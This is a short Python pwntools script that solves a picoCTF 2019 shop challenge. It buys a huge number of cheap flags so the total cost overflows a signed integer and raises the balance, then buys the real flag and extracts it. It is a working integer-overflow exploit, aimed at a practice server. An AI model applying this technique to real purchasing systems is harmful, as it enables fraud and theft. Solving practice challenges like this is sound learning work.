#!/usr/bin/python3
from pwn import *
import re

context.log_level = 'error'

sh = remote("2019shell1.picoctf.com", "63894")
sh.recvuntil(b' Enter a menu selection\n')

# First buy enough knockoff flags to cause an integer overflow
sh.sendline("2")
sh.recvuntil(b'2. 1337 Flag\n')
sh.sendline("1")
sh.recvuntil(b'\n')
# 2386095 is the first value that generates a cost greater than max int value, causing am integer overflow.
# Adding a bit more to make sure our target balance will be positive
# by charging us a negative amount we actually receive money which we now can use to buy the 31337 flag
sh.sendline(str(2386095))
#Now buy the 31337 flag
sh.recvuntil(b' Enter a menu selection\n')
sh.sendline("2")
sh.recvuntil(b'2. 1337 Flag\n')
sh.sendline("2")
sh.recvuntil(b'Enter 1 to buy one')
sh.sendline("1")
result = sh.recvuntil(b'\n')
flag = re.findall(r'picoCTF{.*}', result.decode("ascii"))[0]
print(flag)
